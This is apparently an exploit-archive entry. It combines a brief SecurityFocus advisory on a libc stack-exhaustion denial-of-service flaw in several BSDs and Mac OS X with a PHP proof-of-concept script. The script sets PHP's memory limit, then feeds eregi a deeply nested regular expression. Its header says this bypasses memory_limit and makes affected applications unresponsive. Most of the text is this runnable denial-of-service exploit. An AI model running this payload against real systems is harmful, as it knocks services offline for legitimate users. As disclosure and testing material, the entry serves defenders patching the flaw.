source: http://www.securityfocus.com/bid/50541/info

Multiple Vendors' libc library is prone to a denial-of-service vulnerability due to stack exhaustion.

Successful exploits will allow attackers to make the applications that use the affected library, unresponsive, denying service to legitimate users.

The libc library of the following platforms are affected:

NetBSD 5.1
OpenBSD 5.0
FreeBSD 8.2
Apple Mac OSX

Other versions may also be affected. 

<?
/*
PHP 5.4 5.3 memory_limit bypass exploit poc
by Maksymilian Arciemowicz http://cxsecurity.com/
cxib [ a.T] cxsecurity [ d0t] com

To show memory_limit in PHP

# php /www/memlimpoc.php 1 35000000
PHP Fatal error: Allowed memory size of 33554432 bytes exhausted (tried to allocate 35000001 bytes) in
/var/www/memlimpoc.php on line 12

Fatal error: Allowed memory size of 33554432 bytes exhausted (tried to allocate 35000001 bytes) in
/var/www/memlimpoc.php on line 12

and try this

# php /www/memlimpoc.php 2

memory_limit bypassed
*/

ini_set("memory_limit","32M");

if($argv[1]==1)
$sss=str_repeat("A",$argv[2]);
elseif($argv[1]==2)
eregi("(.?)(((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((((
((((((((((((((((((((.*){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){
1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){
1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){
1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){
1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){
1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){
1,2}){1,2}){1,2}){1,2}){1,2}){1,2}){1,2}","a");

?>